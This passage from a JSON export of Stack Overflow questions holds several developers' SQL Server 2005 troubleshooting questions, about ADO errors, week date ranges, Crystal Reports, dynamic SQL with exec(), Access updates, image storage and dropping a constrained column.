version:</p>\n\n<pre><code>SELECT\n   sp.nt_username AS NTUsername,\n   sp.hostname AS HostName\nFROM master.dbo.syslockinfo sli\n   INNER JOIN master.dbo.sysprocesses sp\n   ON sli.req_spid = sp.spid\nWHERE rsc_type = 10 --10=Appliction\nAND rsc_dbid = (\n   SELECT dbid\n   FROM master.dbo.sysprocesses\n   WHERE spid = @@spid)\n</code></pre>\n\n<p>The query <em>executes</em> fine:</p>\n\n<pre><code>IRecordset rs =new Recordset();\nrs.CursorLocation = adUseClient; //the default for a Recordset is adUseServer (Connection.Execute's default is adUseClient)\nrs.CursorType := adOpenForwardOnly; //the default\nrs.Open(szQuery, conn.ConnectionObject,\n       adOpenForwardOnly, //CursorType\n       adLockReadOnly, //LockType\n       adCmdText);\n</code></pre>\n\n<p>But then <strong><em>checking</em></strong> the status of <code>BOF</code> or <code>EOF</code>:</p>\n\n<pre><code>if (rs.EOF) then\n</code></pre>\n\n<p>triggers an exception:</p>\n\n<ul>\n<li>HRESULT: 0x80004005 (Unspecified error)</li>\n<li>Error message: \"Data provider or other service returned an E_FAIL status\"</li>\n</ul>\n\n<p>What is about this query that causes ADO to fail so miserably?</p>\n\n<hr>\n\n<p><strong>Note</strong>: There really <strong><em>is</em></strong> a matching row:</p>\n\n<p><img src=\"http://i.stack.imgur.com/MvCb4.png\" alt=\"enter image description here\"></p>\n\n<p>The <code>provider</code> i'm using in the connection string is <code>Provider=SQLOLEDB</code>.</p>\n\n<p>Bonus Chatter:</p>\n\n<blockquote>\n  <h2>sysprocesses</h2>\n\n<pre><code>  nt_username nchar(128)\n  hostname    nchar(128)\n</code></pre>\n</blockquote>\n\n<p>and querying for both - but one at a time - works, e.g.:</p>\n\n<pre><code>SELECT\n   sp.nt_username AS NTUsername\n</code></pre>\n\n<p>and </p>\n\n<pre><code>SELECT\n   sp.hostname AS HostName\n</code></pre>\n\n<p>work. Querying for both fail.</p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1363,"score":0,"question_id":10349304,"title":"Find the Date range of week by current date in sql?","body":"<p>I want to find record by this week just declare current date. \nExample:</p>\n\n<pre><code>     select datename(dw,getdate())  -- Example today is Friday \"27-04-2012\"\n</code></pre>\n\n<p>so how can i get date range </p>\n\n<pre><code>     start on monday \"23-04-2012\" or sunday \"22-04-2012\"  As @dateStart to\n\n     end on sunday \"29-04-2012\"  or saturday \"28-04-2012\" As @dateEnd\n</code></pre>\n\n<p>then i can select query by</p>\n\n<pre><code>     select * from table where date&gt;=@dateStart  AND date&lt;=@dateEnd\n</code></pre>\n"},{"tags":["sql-server-2005","crystal-reports","sql-server-express"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":10623882,"title":"Database error with Crystal Reports","body":"<p>I have a crystal report that is rendering correctly. Then I have another crystal report which uses a stored procedure Enter image description here]<a href=\"http://i.stack.imgur.com/myNZV.jpg\" rel=\"nofollow\">1</a>ure. It is failing and I am getting the following error.</p>\n\n<p>Connection string has - Integrated Security true; Data Source and Initial Catalog.</p>\n\n<p>Stored procedure is dbo.sp_CalculateReport  and my login ID is associated with DBO</p>\n\n<p>If you click on Security-Users-dbo and check properties. My login ID is displayed as DBO User.</p>\n\n<p>Also, I checked DB_Owner under dbo on Schema Owned by this user.</p>\n\n<p>The code to load reports</p>\n\n<pre><code>        reportdocument.SetDatabaseLogon(ConnStr.Item(\"User ID\"), ConnStr.Item(\"Password\"), ConnStr.Item(\"Data Source\"), ConnStr.Item(\"Initial Catalog\"))\n\n        CrystalReportViewer1.ReportSource = reportdocument\n</code></pre>\n\n<p>Any idea on what might be wrong.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":179,"score":2,"question_id":10623870,"title":"populating sql variable with select statement works but if i put that same statement in variable and try exec() it doesn't work","body":"<p>I am trying to populate a sql variable with a value. It works when the code is like this:</p>\n\n<pre><code>declare @num_records int\nset @num_records = ( select  distinct count(*) as num_recs \n   from dbo.tbllookup  )\nprint @num_records\n</code></pre>\n\n<p>For example purpose I have made my query simpler but its a complex query and I want to put it in variable as I have to reuse the part of the query somewhere else. So I tried this but it does not work. The error says \"Incorrect syntax near the keyword 'exec'.\" </p>\n\n<pre><code>declare @num_records int\ndeclare @sqlstr varchar(200)\nset @sqlstr = '( select  distinct count(*) as num_recs \n   from dbo.tbllookup  )'\nset @num_records = exec(@sqlstr)\nprint @num_records\n</code></pre>\n\n<p>I am a sql query newbie. So just want to understand the concept and want to know what I am doing wrong here.</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server-2005","ms-access","ms-access-2007"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":400,"score":2,"question_id":10609665,"title":"Operation Must Use An Updateable Query Error with Access 2007 and SQL 2005 Backend","body":"<p>I'm using VB code in Access 2007 with a SQL 2005 backbone. My SQL server resides on a separate machine and the code below runs on a client. The problem is when I run the UPDATE command below I get an error \"Operation Must Use An Updateable Query\". I know this is common, but all my research on the internet didn't produce anything similar to my situation.</p>\n\n<pre><code>Dim MyDB as DAO.Database\nDim sSQL as String\nsSQL = \"UPDATE tblBMS_Batch SET Status = 70 WHERE Batch_ID = 108582\"\nMyDB.Execute sSQL\n</code></pre>\n\n<p>The table set up is below</p>\n\n<pre><code>SET ANSI_NULLS ON\nGO\nSET QUOTED_IDENTIFIER ON\nGO\nSET ANSI_PADDING ON\nGO\nCREATE TABLE [dbo].[tblBMS_Batch](\n[Batch_Id] [int] IDENTITY(1,1) NOT NULL,\n[SDetail_Id] [int] NULL,\n[Destination_Id] [int] NULL,\n[Batch_Number] [smallint] NULL,\n[Line_Number] [smallint] NULL,\n[Packing_Number] [smallint] NULL,\n[Start_Time] [datetime] NULL,\n[End_Time] [datetime] NULL,\n[Status] [smallint] NULL,\n[Batch_Note] [varchar](1000) NULL,\n[Employee_Number] [smallint] NULL,\n[PLC_BatchNumber] [smallint] NULL,\n[Packing_BatchLetter] [varchar](3) NULL,\n[Number_Bags] [smallint] NULL,\n[Abort_Status] [bit] NULL,\n[Return_Bags] [smallint] NULL\n) ON [PRIMARY]\n\nGO\nSET ANSI_PADDING OFF\n</code></pre>\n\n<p>The error occurs on the Execute. To make it more confusing the exact same UPDATE works in SQL directly, and I can also update that table in other VB code in a separate application on the same machine (albeit using ADODB connection).</p>\n\n<p>Any ideas? I'm pretty stumped here. Thanks in advance.</p>\n\n<p>Jason</p>\n"},{"tags":["c#","visual-studio-2010","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":737,"score":0,"question_id":9069742,"title":"Store image in database and retrieve it","body":"<p>My code for inserting image in database is as follows:</p>\n\n<pre><code>MemoryStream ms =new MemoryStream();\nbyte[] PhotoByte=null;\nPhotoByte=ms.ToArray();\npictureBox1.Image.Save(ms, ImageFormat.Jpeg);\nPhotoByte =ms.ToArray();\nStr = \"insert into Experimmm Values('\" + PhotoByte + \"','\" + textBox1.Text + \"')\";\nConn.Open();\ncmd.Connection = Conn;\ncmd.CommandText = Str;\ncmd.ExecuteNonQuery();\nConn.Close();\n</code></pre>\n\n<p>Which is going well. I can see binary data in ma database table like <code>&lt;Binary Data&gt;</code>\nMy code for retrieving data is:</p>\n\n<pre><code>Str =\"select * from Experimmm where id = '\" +textBox2.Text + \"'\";\nConn.Open();\ncmd.Connection = Conn;\ncmd.CommandText = Str;\ndr = cmd.ExecuteReader();\nif (dr.Read())\n{ label1.Text = dr.GetValue(1).ToString();\nbyte[] PhotoByte = (byte[])dr.GetValue(0);\nMemoryStream mem = new MemoryStream(PhotoByte, 0, PhotoByte.Length);\n//but an error takes place on next line \"Parameter is not valid.\"             \npictureBox2.Image = Image.FromStream(mem);\n} Conn.Close();\n</code></pre>\n\n<p>I'm using visual studio 10 , C# ,sql server 2005</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":206,"score":0,"question_id":10619320,"title":"drop a column with a default constraint","body":"<p>I created a table:</p>\n\n<pre><code>create table userTable\n(\n    userId int identity(1,1) not null,\n    userName nvarchar(20) not null,\n    joinDate datetime not null default getdate()\n        constraint pk_userTable primary key(userId) on [primary]\n\n)\n</code></pre>\n\n<p>Then I tried to delete the column joinDate:</p>\n\n<pre><code>alter table userTable drop column joinDate\n</code></pre>\n\n<p>But I got the error:</p>\n\n<blockquote>\n  <p>Msg 5074, Level 16, State 1, Line 1<br>\n  The object 'DF_userTable_joinD_31EC6D26' is dependent on column 'joinDate'.<br>\n  Msg 4922, Level 16, State 9, Line 1<br>\n  ALTER TABLE DROP COLUMN joinDate failed because one or more objects \n  access this column.</p>\n</blockquote>\n\n<p>why is it so? </p>\n\n<p>Also, I want to specify values only for the userName column when inserting a new row, but when I try to do that:</p>\n\n<pre><code>INSERT userTable SELECT 'name1';\n</code></pre>\n\n<p>I get the error message:</p>\n\n<blockquote>\n  <p>Msg 213, Level 16, State 1, Line 1 <br>Column name or number of supplied\n  values does not match table definition.</p>\n</blockquote>\n\n<p>Why am I getting this error?</p>\n"}]}
